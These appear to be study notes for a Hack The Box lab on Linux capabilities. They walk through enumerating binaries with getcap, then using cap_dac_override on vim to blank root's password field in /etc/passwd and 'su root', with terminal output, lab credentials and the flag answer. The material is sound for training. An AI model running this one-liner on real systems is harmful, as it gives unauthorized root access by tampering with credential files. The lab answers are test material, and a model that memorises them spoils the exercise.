# Capabilities

## ID
704

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 11 — Capabilities

## Description
Covers Linux capabilities enumeration with `getcap`, and exploiting `cap_dac_override` on vim to remove the root password hash from `/etc/passwd` and `su` to root.

## Tags
capabilities, cap_dac_override, getcap, setcap, vim, privilege-escalation

## Commands
- `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`
- `getcap /usr/bin/vim.basic`
- `/usr/bin/vim.basic /etc/passwd`
- `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`
- `su root`

## What This Section Covers
Linux capabilities are a fine-grained alternative to SUID — they grant specific privileges to binaries without giving full root. When misconfigured (e.g., `cap_dac_override` on an editor), they allow bypassing file permission checks entirely, enabling direct modification of system files like `/etc/passwd` to escalate to root.

## Methodology
1. **Enumerate capabilities** — run `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` to list all binaries with capabilities set.
2. **Identify dangerous capabilities** — look for `cap_dac_override`, `cap_setuid`, `cap_setgid`, `cap_sys_admin`, `cap_sys_ptrace`, or `cap_sys_module`.
3. **Check the binary** — determine if the capable binary can read/write files or execute commands (editors, interpreters, etc.).
4. **Exploit** — use the binary's capability to modify a privileged file (e.g., remove root's password hash from `/etc/passwd`) or spawn a shell.
5. **Escalate** — `su root` with no password, or leverage the modified file for access.

## Multi-step Workflow (optional)
```
# cap_dac_override on vim — full privesc chain
# 1. Enumerate capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# 2. Use vim to remove root's password hash (non-interactive)
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# 3. Switch to root (no password needed)
su root
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Escalate via capabilities, read /root/flag.txt | HTB{c4paBili7i3s_pR1v35c} | `cap_dac_override` on vim → edit `/etc/passwd` → remove root `x` → `su root` → `cat /root/flag.txt` |

## Step-by-Step Walkthrough

### Setup
```
ssh htb-student@<TARGET_IP>
# password: HTB_@cademy_stdnt!
```

```
┌─[eu-academy-1]─[10.10.15.186]─[htb-ac-594497@htb-7jmoga2pu3]─[~]
└──╼ [★]$ ssh htb-student@10.129.61.128

The authenticity of host '10.129.61.128 (10.129.61.128)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.61.128' (ECDSA) to the list of known hosts.
htb-student@10.129.61.128's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-149-generic x86_64)

<SNIP>

htb-student@ubuntu:~$
```

### Q1 — Escalate via capabilities and read the flag

**Step 1 — Enumerate binaries with capabilities:**
```
find /usr/bin/ /usr/sbin/ /usr/local/bin/ /usr/local/sbin/ -type f -exec getcap {} \;
```

```
htb-student@ubuntu:~$ find /usr/bin/ /usr/sbin/ /usr/local/bin/ /usr/local/sbin/ -type f -exec getcap {} \;

/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip          # <-- exploitable
```

**Step 2 — Use vim to edit `/etc/passwd` and remove root's password hash:**
```
/usr/bin/vim.basic /etc/passwd
```
In vim, change the root line from `root:x:0:0:...` to `root::0:0:...` (delete the `x`), then `:wq`.

Alternatively, do it non-interactively:
```
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

**Step 3 — Switch to root and grab the flag:**
```
su root
cat /root/flag.txt
```

```
htb-student@ubuntu:~$ su root

root@ubuntu:/home/htb-student# cat /root/flag.txt

HTB{c4paBili7i3s_pR1v35c}
```

Answer: `HTB{c4paBili7i3s_pR1v35c}`

## Key Takeaways
- Capabilities are the "quieter cousin" of SUID — they don't show up in `find -perm -4000` scans. You must use `getcap` to find them.
- `cap_dac_override` = bypass all read/write/execute permission checks. On any editor or file-manipulation tool, this is instant root.
- The `/etc/passwd` technique (removing the `x` from root's line) eliminates the password requirement for `su root`. The `x` tells the system to check `/etc/shadow` — without it, no password is needed.
- The non-interactive vim one-liner (`echo -e ':%s/...\nwq!' | vim -es`) is cleaner for scripts and avoids TTY issues.
- Key dangerous capabilities to watch for: `cap_dac_override`, `cap_setuid`, `cap_setgid`, `cap_sys_admin`, `cap_sys_module`, `cap_sys_ptrace`.
- Capability values matter: `+eip` (effective + inheritable + permitted) is the most dangerous; `+ep` alone is still exploitable.

## Gotchas
- `getcap` only shows capabilities on files you can access — if binaries are in unusual paths, expand the `find` search directories.
- After editing `/etc/passwd`, the change is **permanent** on the target. In a real engagement, restore the original `x` after getting your evidence.
- Some systems use `vimx` or `vim.tiny` instead of `vim.basic` — check which vim variant has the capability set.
